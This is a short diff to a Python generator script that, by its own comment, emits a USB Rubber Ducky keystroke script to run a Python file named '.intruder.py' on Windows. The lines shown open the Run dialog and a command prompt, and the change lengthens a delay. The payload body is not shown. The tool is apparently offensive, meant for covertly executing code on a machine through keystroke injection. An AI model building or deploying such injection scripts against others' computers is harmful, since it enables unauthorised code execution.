@@ -1,3 +1,6 @@
+# Prepares a python script for windows execution through a ducky script
+# Writes to stdout
+
 import sys
 import os
 import base64
@@ -6,7 +9,7 @@ import base64
 client_side_file = ".intruder.py"
 
 # prepare
-print("DELAY 700")
+print("DELAY 1000")
 print("GUI r")
 print("STRING cmd")
 print("ENTER")
